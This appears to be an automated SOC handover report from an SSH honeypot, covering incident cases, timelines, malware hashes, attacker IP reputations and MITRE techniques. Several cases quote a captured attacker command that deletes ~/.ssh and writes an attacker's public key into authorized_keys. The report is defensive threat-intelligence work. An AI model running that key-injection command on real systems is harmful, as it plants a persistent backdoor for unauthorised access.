| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-23 20:19:50` | `cowrie.session.connect` |
| `2026-04-23 20:19:50` | `cowrie.client.version` |
| `2026-04-23 20:19:50` | `cowrie.client.kex` |
| `2026-04-23 20:19:51` | `cowrie.login.success` |
| `2026-04-23 20:19:52` | `cowrie.session.params` |
| `2026-04-23 20:19:52` | `cowrie.command.input` |
| `2026-04-23 20:19:52` | `cowrie.command.failed` |
| `2026-04-23 20:19:52` | `cowrie.log.closed` |
| `2026-04-23 20:19:53` | `cowrie.session.params` |
| `2026-04-23 20:19:53` | `cowrie.command.input` |
| `2026-04-23 20:19:53` | `cowrie.session.file_download` |
| `2026-04-23 20:19:53` | `cowrie.log.closed` |
| `2026-04-23 20:19:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.88.137[.]213` to AbuseIPDB if not already reported
- [ ] Block `102.88.137[.]213` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-51c6ace375b8

| Field | Detail |
|---|---|
| **Source IP** | `102.88.137[.]213` |
| **First Seen** | 2026-04-23 20:19 |
| **Last Seen** | 2026-04-23 20:19 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-23 20:19:57` | `cowrie.session.connect` |
| `2026-04-23 20:19:57` | `cowrie.client.version` |
| `2026-04-23 20:19:57` | `cowrie.client.kex` |
| `2026-04-23 20:19:58` | `cowrie.login.success` |
| `2026-04-23 20:19:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.88.137[.]213` to AbuseIPDB if not already reported
- [ ] Block `102.88.137[.]213` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3eab55709468

| Field | Detail |
|---|---|
| **Source IP** | `102.88.137[.]213` |
| **First Seen** | 2026-04-23 20:21 |
| **Last Seen** | 2026-04-23 20:21 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-23 20:21:39` | `cowrie.session.connect` |
| `2026-04-23 20:21:39` | `cowrie.client.version` |
| `2026-04-23 20:21:39` | `cowrie.client.kex` |
| `2026-04-23 20:21:41` | `cowrie.login.success` |
| `2026-04-23 20:21:41` | `cowrie.session.params` |
| `2026-04-23 20:21:41` | `cowrie.command.input` |
| `2026-04-23 20:21:41` | `cowrie.command.failed` |
| `2026-04-23 20:21:42` | `cowrie.log.closed` |
| `2026-04-23 20:21:42` | `cowrie.session.params` |
| `2026-04-23 20:21:42` | `cowrie.command.input` |
| `2026-04-23 20:21:43` | `cowrie.session.file_download` |
| `2026-04-23 20:21:43` | `cowrie.log.closed` |
| `2026-04-23 20:21:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.88.137[.]213` to AbuseIPDB if not already reported
- [ ] Block `102.88.137[.]213` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-728bdeb90c12

| Field | Detail |
|---|---|
| **Source IP** | `102.88.137[.]213` |
| **First Seen** | 2026-04-23 20:21 |
| **Last Seen** | 2026-04-23 20:21 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-23 20:21:46` | `cowrie.session.connect` |
| `2026-04-23 20:21:46` | `cowrie.client.version` |
| `2026-04-23 20:21:46` | `cowrie.client.kex` |
| `2026-04-23 20:21:47` | `cowrie.login.success` |
| `2026-04-23 20:21:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.88.137[.]213` to AbuseIPDB if not already reported
- [ ] Block `102.88.137[.]213` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ecb5c1c5d973

| Field | Detail |
|---|---|
| **Source IP** | `102.88.137[.]213` |
| **First Seen** | 2026-04-23 20:22 |
| **Last Seen** | 2026-04-23 20:22 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-23 20:22:35` | `cowrie.session.connect` |
| `2026-04-23 20:22:35` | `cowrie.client.version` |
| `2026-04-23 20:22:35` | `cowrie.client.kex` |
| `2026-04-23 20:22:36` | `cowrie.login.success` |
| `2026-04-23 20:22:36` | `cowrie.session.params` |
| `2026-04-23 20:22:36` | `cowrie.command.input` |
| `2026-04-23 20:22:36` | `cowrie.command.failed` |
| `2026-04-23 20:22:37` | `cowrie.log.closed` |
| `2026-04-23 20:22:37` | `cowrie.session.params` |
| `2026-04-23 20:22:37` | `cowrie.command.input` |
| `2026-04-23 20:22:38` | `cowrie.session.file_download` |
| `2026-04-23 20:22:38` | `cowrie.log.closed` |
| `2026-04-23 20:22:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.88.137[.]213` to AbuseIPDB if not already reported
- [ ] Block `102.88.137[.]213` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-618a2b8e14d3

| Field | Detail |
|---|---|
| **Source IP** | `102.88.137[.]213` |
| **First Seen** | 2026-04-23 20:22 |
| **Last Seen** | 2026-04-23 20:22 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-23 20:22:41` | `cowrie.session.connect` |
| `2026-04-23 20:22:41` | `cowrie.client.version` |
| `2026-04-23 20:22:41` | `cowrie.client.kex` |
| `2026-04-23 20:22:43` | `cowrie.login.success` |
| `2026-04-23 20:22:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.88.137[.]213` to AbuseIPDB if not already reported
- [ ] Block `102.88.137[.]213` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7d9abf38c7cd

| Field | Detail |
|---|---|
| **Source IP** | `102.88.137[.]213` |
| **First Seen** | 2026-04-23 20:23 |
| **Last Seen** | 2026-04-23 20:23 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-23 20:23:29` | `cowrie.session.connect` |
| `2026-04-23 20:23:29` | `cowrie.client.version` |
| `2026-04-23 20:23:30` | `cowrie.client.kex` |
| `2026-04-23 20:23:31` | `cowrie.login.success` |
| `2026-04-23 20:23:32` | `cowrie.session.params` |
| `2026-04-23 20:23:32` | `cowrie.command.input` |
| `2026-04-23 20:23:32` | `cowrie.command.failed` |
| `2026-04-23 20:23:32` | `cowrie.log.closed` |
| `2026-04-23 20:23:32` | `cowrie.session.params` |
| `2026-04-23 20:23:32` | `cowrie.command.input` |
| `2026-04-23 20:23:33` | `cowrie.session.file_download` |
| `2026-04-23 20:23:33` | `cowrie.log.closed` |
| `2026-04-23 20:23:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.88.137[.]213` to AbuseIPDB if not already reported
- [ ] Block `102.88.137[.]213` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-41955eeab55b

| Field | Detail |
|---|---|
| **Source IP** | `102.88.137[.]213` |
| **First Seen** | 2026-04-23 20:23 |
| **Last Seen** | 2026-04-23 20:23 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-23 20:23:36` | `cowrie.session.connect` |
| `2026-04-23 20:23:36` | `cowrie.client.version` |
| `2026-04-23 20:23:36` | `cowrie.client.kex` |
| `2026-04-23 20:23:38` | `cowrie.login.success` |
| `2026-04-23 20:23:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.88.137[.]213` to AbuseIPDB if not already reported
- [ ] Block `102.88.137[.]213` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a498bb7f7b64

| Field | Detail |
|---|---|
| **Source IP** | `102.88.137[.]213` |
| **First Seen** | 2026-04-23 20:25 |
| **Last Seen** | 2026-04-23 20:25 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-23 20:25:15` | `cowrie.session.connect` |
| `2026-04-23 20:25:15` | `cowrie.client.version` |
| `2026-04-23 20:25:16` | `cowrie.client.kex` |
| `2026-04-23 20:25:17` | `cowrie.login.success` |
| `2026-04-23 20:25:17` | `cowrie.session.params` |
| `2026-04-23 20:25:17` | `cowrie.command.input` |
| `2026-04-23 20:25:17` | `cowrie.command.failed` |
| `2026-04-23 20:25:18` | `cowrie.log.closed` |
| `2026-04-23 20:25:18` | `cowrie.session.params` |
| `2026-04-23 20:25:18` | `cowrie.command.input` |
| `2026-04-23 20:25:19` | `cowrie.session.file_download` |
| `2026-04-23 20:25:19` | `cowrie.log.closed` |
| `2026-04-23 20:25:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.88.137[.]213` to AbuseIPDB if not already reported
- [ ] Block `102.88.137[.]213` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cee12968f67f

| Field | Detail |
|---|---|
| **Source IP** | `102.88.137[.]213` |
| **First Seen** | 2026-04-23 20:25 |
| **Last Seen** | 2026-04-23 20:25 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-23 20:25:22` | `cowrie.session.connect` |
| `2026-04-23 20:25:22` | `cowrie.client.version` |
| `2026-04-23 20:25:22` | `cowrie.client.kex` |
| `2026-04-23 20:25:24` | `cowrie.login.success` |
| `2026-04-23 20:25:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.88.137[.]213` to AbuseIPDB if not already reported
- [ ] Block `102.88.137[.]213` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8154332af74d

| Field | Detail |
|---|---|
| **Source IP** | `102.88.137[.]213` |
| **First Seen** | 2026-04-23 20:27 |
| **Last Seen** | 2026-04-23 20:27 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-23 20:27:04` | `cowrie.session.connect` |
| `2026-04-23 20:27:04` | `cowrie.client.version` |
| `2026-04-23 20:27:04` | `cowrie.client.kex` |
| `2026-04-23 20:27:05` | `cowrie.login.success` |
| `2026-04-23 20:27:06` | `cowrie.session.params` |
| `2026-04-23 20:27:06` | `cowrie.command.input` |
| `2026-04-23 20:27:06` | `cowrie.command.failed` |
| `2026-04-23 20:27:06` | `cowrie.log.closed` |
| `2026-04-23 20:27:07` | `cowrie.session.params` |
| `2026-04-23 20:27:07` | `cowrie.command.input` |
| `2026-04-23 20:27:07` | `cowrie.session.file_download` |
| `2026-04-23 20:27:07` | `cowrie.log.closed` |
| `2026-04-23 20:27:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.88.137[.]213` to AbuseIPDB if not already reported
- [ ] Block `102.88.137[.]213` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-776394096b56

| Field | Detail |
|---|---|
| **Source IP** | `102.88.137[.]213` |
| **First Seen** | 2026-04-23 20:27 |
| **Last Seen** | 2026-04-23 20:27 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-23 20:27:11` | `cowrie.session.connect` |
| `2026-04-23 20:27:11` | `cowrie.client.version` |
| `2026-04-23 20:27:11` | `cowrie.client.kex` |
| `2026-04-23 20:27:12` | `cowrie.login.success` |
| `2026-04-23 20:27:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.88.137[.]213` to AbuseIPDB if not already reported
- [ ] Block `102.88.137[.]213` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `106.13.135[.]26` | **28** | 2026-04-23 19:56 | 2026-04-23 20:43 | 44m | 4 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `102.88.137[.]213` | **27** | 2026-04-23 20:00 | 2026-04-23 20:27 | 0m | 27 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `183.230.150[.]99` | **2** | 2026-04-23 20:20 | 2026-04-23 20:22 | 2m | 0 | `T1592` | 🟢 LOW |
| `1.34.94[.]206` | 1 | 2026-04-23 19:22 | 2026-04-23 19:22 | 15s | 0 | `T1592` | 🟢 LOW |
| `103.31.38[.]83` | 1 | 2026-04-23 20:49 | 2026-04-23 20:50 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `120.48.170[.]9` | 1 | 2026-04-23 19:41 | 2026-04-23 19:41 | 0s | 0 | `T1592` | 🟢 LOW |
| `120.48.42[.]17` | 1 | 2026-04-23 19:58 | 2026-04-23 20:00 | 77s | 0 | `T1592` | 🟢 LOW |
| `130.12.180[.]174` | 1 | 2026-04-23 19:57 | 2026-04-23 19:57 | 0s | 0 | `T1592` | 🟢 LOW |
| `176.32.193[.]16` | 1 | 2026-04-23 19:21 | 2026-04-23 19:21 | 0s | 0 | `T1592` | 🟢 LOW |
| `185.103.202[.]193` | 1 | 2026-04-23 20:47 | 2026-04-23 20:47 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `72.56.108[.]236` | 1 | 2026-04-23 20:20 | 2026-04-23 20:20 | 0s | 0 | `T1592` | 🟢 LOW |
| `93.123.109[.]222` | 1 | 2026-04-23 20:43 | 2026-04-23 20:43 | 0s | 3 | `T1110.001` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (23 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/76 ✅ |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 44/100 | 🟡 MEDIUM | **36/76** 🔴 |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `38ef0580d99fb1524c13f8dc4981fe2757deb290b29f947ebc24b4b359756f63` | ELF Binary (Linux executable) (x86-64 64-bit) | `38ef0580d99fb152...` | 44/100 | 🟡 MEDIUM | **36/76** 🔴 |
| `72ce5b00ca4bfa0c18fcdf03a15e5391a85d81300783626598fe7e022e0ec538` | ELF Binary (Linux executable) (x86-64 64-bit) | `72ce5b00ca4bfa0c...` | 44/100 | 🟡 MEDIUM | **36/76** 🔴 |
| `776c0fccae481c384f5636903ce500fae22803cf8778ec9a029956bb85a68010` | ELF Binary (Linux executable) (x86-64 64-bit) | `776c0fccae481c38...` | 43/100 | 🟡 MEDIUM | **34/76** 🔴 |
| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **39/76** 🔴 |
| `8daf92f0870c58ece8b68a3057c3ab6e8477215f853c54cdfe790acf1141161d` | ELF Binary (Linux executable) (ARM 32-bit) | `8daf92f0870c58ec...` | 43/100 | 🟡 MEDIUM | **33/76** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 44/100 | 🟡 MEDIUM | **37/76** 🔴 |
| `9a45029b646e2d20015695b5541f5fb76eace740bf329dc05af8ea53bd89619c` | Unknown binary | `9a45029b646e2d20...` | 0/100 | 🟢 LOW | 0/76 ✅ |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **50/76** 🔴 |
| `a2812d2ca38cf4e519e386901fb89c393d891417a168a278bbb9b9d4f38145cc` | ELF Binary (Linux executable) (x86-64 64-bit) | `a2812d2ca38cf4e5...` | 43/100 | 🟡 MEDIUM | **34/76** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 11/100 | 🟢 LOW | **30/76** 🔴 |
| `db2b1183a337cdf116ec3158067f70502e4534b6c27dd3a984c0bacb030732d5` | ELF Binary (Linux executable) (x86-64 64-bit) | `db2b1183a337cdf1...` | 42/100 | 🟡 MEDIUM | **31/75** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 43/100 | 🟡 MEDIUM | **34/76** 🔴 |
| `tmp3v3avwej` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmp41sthfqu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **50/76** 🔴 |
| `tmpjyzmzmsu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **50/76** 🔴 |
| `tmpw4ocpnlc` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **50/76** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **50/76** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `176.32.193[.]16` | AM | Interactive TV LLC | **100** ⚠️ | 50 |
| `1.34.94[.]206` | TW | Chunghwa Telecom Co.,Ltd. | **100** ⚠️ | 13 |
| `103.31.38[.]83` | ID | PT Cloud Hosting Indonesia | **100** ⚠️ | 23 |
| `130.12.180[.]174` | DE | Virtualine Technologies | **100** ⚠️ | 50 |
| `185.103.202[.]193` | TR | HDM Dijital Hizmetleri Ticaret Limited Sirketi | **100** ⚠️ | 0 |
| `72.56.108[.]236` | DE | Timeweb, LLP | **100** ⚠️ | 18 |
| `183.230.150[.]99` | CN | China Mobile Communications Corporation | **100** ⚠️ | 1 |
| `106.13.135[.]26` | CN | Beijing Baidu Netcom Science and Technology Co., Ltd. | **100** ⚠️ | 50 |
| `120.48.42[.]17` | CN | Beijing Baidu Netcom Science and Technology Co., Ltd. | **100** ⚠️ | 50 |
| `102.88.137[.]213` | NG | MTN Nigeria | **100** ⚠️ | 50 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 81 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 35 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 22 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 11 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 11 |

---

## 🔕 False Positive Summary (6 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 1 |
| AbuseIPDB score 15 below threshold 25 | 1 |
| AbuseIPDB score 2 below threshold 25 | 1 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 3 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 94 cases |
| Tool 34  | Credential Extractor        | ✅ 59 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 4 fingerprints |
| Tool 36  | Command Clustering          | ✅ 2 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 16 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 6 filtered (6.4%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 14 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 23 files |
| Tool 33  | YARA Classifier             | ✅ 8 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 22 priority case(s) shown individually · 12 recon entry/entries in table (3 group(s) consolidating 57 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
